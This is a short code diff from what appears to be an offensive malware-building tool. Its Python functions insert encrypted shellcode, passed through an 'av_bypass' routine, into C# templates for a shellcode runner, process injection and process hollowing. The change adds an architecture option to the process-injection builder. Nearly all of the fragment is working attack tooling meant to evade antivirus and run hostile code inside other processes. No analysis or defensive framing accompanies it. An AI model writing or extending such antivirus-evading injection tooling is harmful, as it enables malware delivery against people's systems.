@@ -35,12 +35,12 @@ def shellcode_runner(shellcode, enc, key, iv, time):
     payload = av_bypass(shellcode, enc, key, iv, time)
     return code.replace('{{PAYLOAD}}', payload)
 
-def process_injection(shellcode, enc, key, iv, time, process):
+def process_injection(shellcode, enc, key, iv, time, process, arch):
     with open(os.path.join(path, 'templates/cs/process_injection.cs'), 'r') as f:
         code = f.read()
     payload = av_bypass(shellcode, enc, key, iv, time)
     process_name = os.path.splitext(os.path.basename(process.replace('\\','/')))[0]
-    return code.replace('{{PAYLOAD}}', payload).replace('{{PROCESS}}', process_name)
+    return code.replace('{{PAYLOAD}}', payload).replace('{{PROCESS}}', process_name).replace('{{ARCH}}', str(arch.lower()=='x32').lower())
 
 def process_hollowing(shellcode, enc, key, iv, time, process):
     with open(os.path.join(path, 'templates/cs/process_hollowing.cs'), 'r') as f:
